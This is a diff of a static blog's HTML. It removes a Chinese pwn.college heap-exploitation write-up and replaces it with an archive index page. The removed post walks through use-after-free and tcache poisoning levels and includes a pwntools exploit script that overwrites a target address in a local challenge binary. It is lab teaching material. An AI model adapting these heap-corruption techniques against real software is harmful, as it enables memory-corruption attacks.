@@ -8,7 +8,7 @@
 
 <head>
 
-  <title>Dynamic_Allocator_Misuse | Rin</title>
+  <title>Archives: 2022/4 | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -45,13 +45,10 @@
   
 
   <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
-<link rel="stylesheet" href="/css/prism.css" type="text/css"><link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
-<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
-<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <!--
-<body class="post-template">
+<body class="home-template">
 -->
 <body id="index" class="lightnav animsition">
       <!-- ============================ Off-canvas navigation =========================== -->
@@ -202,152 +199,69 @@
         <!-- ============================ Header & Logo bar =========================== -->
 
 
-      
-<section id="intro">
-    <div class="container">
-        <div class="row col-md-offset-2">
-            <div class="col-md-8">
-    			<span class="post-meta">
-      <time datetime="2022-03-30T11:22:19.899Z" itemprop="datePublished">
-          2022-03-30
-      </time>
-    
-    
-    | 
-    <a href='/tags/pwncollege/'>pwncollege</a>
-    
-    
-</span>
-                <h1>Dynamic_Allocator_Misuse</h1>
+      <!-- ============================ Hero Image =========================== -->
+
+<section id="hero" class="scrollme">
+    <div class="container-fluid element-img" style="background: url(https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/cover.jpg) no-repeat center center fixed;background-size: cover">
+        <div class="row">
+            <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
+                <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
+                    <div>
+                        
+                        <h2><span>RIN777</span></h2>
+                        <p></p>
+                        
+                        <h2></h2>
+                        <p>努力は嘘をつく、でも無駄にはならない</p>
+                        
+
+                    </div>
+                </div>
             </div>
+            <!-- // .col-md-12 -->
         </div>
-        <div class="col-md-8 col-md-offset-2">
-      		
-    <div id="aplayer-qTbIHYAK" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
-
-<h4><span id="level1">Level1</span></h4><p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%887.39.05.png" alt="截屏2022-03-30 下午7.39.05"></p>
-<p>​        开门绿，你从未拥有过的全新体验（</p>
-<p>​        给出了增删查以及load flag的四个功能，free有uaf，纯纯的uaf啊。</p>
-<p>​        直接malloc flag_chunk_size，free，然后load flag，flag chunk被load在chunk0内存空间，然后puts就行。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%887.42.01.png" alt="截屏2022-03-30 下午7.42.01"></p>
-<h4><span id="level11">Level1.1</span></h4><p>​        故技重施。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%887.47.45.png" alt="截屏2022-03-30 下午7.47.45"></p>
-<h4><span id="level20">Level2.0</span></h4><p>​        做法和楼上完全一致，但是程序逻辑其实是不一样的，详见level2.1。</p>
-<h4><span id="level21">Level2.1</span></h4><p>​        level2和1的差别就是load flag并不是使用固定的size，而是随机数，在2.0我们可以看到flag chunk的size，但是2.1不行，所以需要想办法绕过。</p>
-<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.00.23.png" alt="截屏2022-03-30 下午8.00.23"></p>
-<p>​        一个128 ～ 999的随机数。</p>
-<p>​        所以绕过的思路也非常之简单，只需要malloc的chunk size大于999+0x8就行。我随便malloc了1200，亲测有效。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.07.05.png" alt="截屏2022-03-30 下午8.07.05"></p>
-<p>​        </p>
-<h4><span id="level30">Level3.0</span></h4><p>连续malloc 两个832sizechunk，然后依次free chunk1    和chunk0。再read flag，puts chunk1。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.27.56.png" alt="截屏2022-03-30 下午8.27.56"></p>
-<h4><span id="level31">Level3.1</span></h4><p>​        一样。</p>
-<h4><span id="level40">Level4.0</span></h4><p>​        （这个不会是level3的随机数版吧。。。。</p>
-<p>还好，不是）</p>
-<p>​        我才意识到它那个read two times其实会覆盖第一次read的内容，所以puts的话是要write 第二次read的flag。</p>
-<p>​        回到题本身，多出一个scanf的功能，应该是希望我们修改fd。话说这个是真的不走寻常路，一上来就整tcache。但是也能理解，tcache和fastbin在这种等级上的利用难度其实差不多。</p>
-<p>​        程序依旧是可以uaf，malloc flag chunk size，free掉，然后edit fd，使其指向flag chunk，下一次malloc就会分配flag chunk的空间。也就是能够将flag puts出来，但是有个问题就是，如果直接输入fd的覆盖的话似乎是没有办法转换成字节流的，我又懒得写脚本，怎么搞呢。能跳过这道题吗。</p>
-<p>​        能*v*</p>
-<h4><span id="level50">Level5.0</span></h4><p>​        感觉前面的level没啥好做的。                </p>
-<p>​        可以add 最多16个chunk，多了一个puts_flag功能，大致就是只要flag ptr指向的地方不为0就能打印flag。但是程序并没有给我们提供覆盖内存的功能。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] flag_buffer = malloc(%d)\n&quot;</span>, <span class="number">432LL</span>);</span><br><span class="line">        size_4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1B0</span>uLL);</span><br><span class="line">        *(_QWORD *)size_4 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] flag_buffer = %p\n&quot;</span>, size_4);</span><br><span class="line">      &#125;</span><br><span class="line">      v3 = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      read(v3, (<span class="keyword">void</span> *)(size_4 + <span class="number">16</span>), <span class="number">0x80</span>uLL);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*] read the flag!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;puts_flag&quot;</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)size_4 )</span><br><span class="line">      <span class="built_in">puts</span>(size_4 + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Not authorized!&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>​        flag 是在flag ptr + 16    的地方读入的，但是需要让flag_ptr +不为0， 并没有任何输入的方法的话，只能通过构造chunk的meta datd了。不过其实我不理解，flag已经被load进了idx0，为什么puts出来是空字节…大概是因为flag是在ptr+16的地方读入，前面的字符都是<code>\x00</code>，所以还是需要覆盖flag ptr首字节为自然数，然后通过<code>puts_flag</code>拿flag。</p>
-<p>​        但是这个思路感觉行不通，因为每次load flag之后都会把ptr首字节置0，所以有了另外一种思路就是在ptr+16的地方伪造idx。也就是需要使一个idx指向ptr+16。</p>
-<h4><span id="level6">Level6</span></h4><p>​        输入的flag与0x42554b处八个字符相等即可拿flag，但是这个地址处的字符显然需要我们自己覆盖。所以思路是利用uaf构造任意地址写。但是又有scanf。这下不得不写脚本了。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-01%20%E4%B8%8B%E5%8D%887.55.48.png" alt="截屏2022-04-01 下午7.55.48"></p>
-<p>蚌埠住了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level6.0&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./babyheap_level6.0&quot;)</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">target_addr = <span class="number">0x42554B</span> - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&quot;malloc&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;free&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;scanf&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">40</span>)<span class="comment">#chunk0</span></span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#bin0</span></span><br><span class="line">payload = p64(target_addr)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">40</span>)<span class="comment">#point to target_addr</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">40</span>)<span class="comment">#point to target_addr</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;send_flag&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Secret: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4><span id="level7">Level7</span></h4><p>​        level6的随机数版，建议别做，折寿。</p>
-<h4><span id="level8">Level8</span></h4><h4><span id><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-01%20%E4%B8%8B%E5%8D%888.19.24.png" alt="截屏2022-04-01 下午8.19.24"></span></h4><p>​        fd的target addt开头是换行符，但是无所谓，直接申请0x426701-0x10就行，下一道。</p>
-<h4><span id="level9">Level9</span></h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-01%20%E4%B8%8B%E5%8D%888.22.39.png" alt="截屏2022-04-01 下午8.22.39"></p>
-<p>​            稍微有些意思，ida摸了一圈并没有看出程序是怎么“discard”chunk的。</p>
-<p>​        明天来做。</p>
-
-            <div class="clearfix"></div>
-            <hr class="nogutter">
-        </div>
-        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
-    
-    <a class="pull-left" href="../week5-3.2/" style="float: left;">
-        ← starctf_2019_quicksort
-    </a>
-    
-    
-    <a class="pull-right" href="../week5-3.1/">
-        gyctf_2020_force →
-    </a>
-    
-</nav>
-
-        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
-  /**
-   * 搜狐畅言
-   */
-
-  /*
-  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
-
-  window.onload = function () {
-    (function () {
-      var appid = 'cytXXXX';
-      var conf = 'prod_xxxxxxxxxxxxxxxxx';
-      var width = window.innerWidth || document.documentElement.clientWidth;
-      var loadJs = function (d, a, id) {
-        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
-        var b = document.createElement("script");
-        b.setAttribute("type", "text/javascript");
-        b.setAttribute("charset", "UTF-8");
-        b.setAttribute("src", d);
-        if (id) {
-          b.setAttribute("id", id);
-        }
-        if (typeof a === "function") {
-          if (window.attachEvent) {
-            b.onreadystatechange = function () {
-              var e = b.readyState;
-              if (e === "loaded" || e === "complete") {
-                b.onreadystatechange = null;
-                a()
-              }
-            }
-          } else {
-            b.onload = a
-          }
-        }
-        c.appendChild(b)
-      };
-
-      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
-        window.changyan.api.config({
-          appid: appid,
-          conf: conf
-        })
-      });
-    })();
-  }
-  */
-
-</script>
-</div>
+        <div class="herofade beige-dk"></div>
     </div>
 </section>
 
-<!-- Highlight.js -->
+<!-- Height spacing helper -->
+<div class="heightblock"></div>
+<!-- // End height spacing helper -->
 
-<link rel="stylesheet"
-href="//highlightjs.org/static/demo/styles/atom-one-light.css">
-<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
-</script>
-<script>
-hljs.initHighlightingOnLoad();
-
-</script>
+<!-- ============================ END Hero Image =========================== -->
 
 
+
+
+<section id="services">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-10 col-md-offset-1">
+                <div class="row boxes">
+                    
+                    
+                        
+                        
+                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
+                            
+                              <h4 class="title"><a href="/2022/04/01/pwn.college_Dynamic_Allocator_Misuse/">Dynamic_Allocator_Misuse</a></h4>
+                            
+                            <p><time datetime="2022-04-01T12:34:14.000Z"><a href="/2022/04/01/pwn.college_Dynamic_Allocator_Misuse/">2022-04-01</a></time></p>
+                        </div>
+                    
+                </div>
+            </div>    
+        </div>
+    </div>
+</section> 
+
+<section id="statement">
+    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
+        <div class="row">
+            <p>“试着开心，好吗？”</p>
+        </div>
+    </div>
+</section>
       
 <!-- ============================ Footer =========================== -->
 
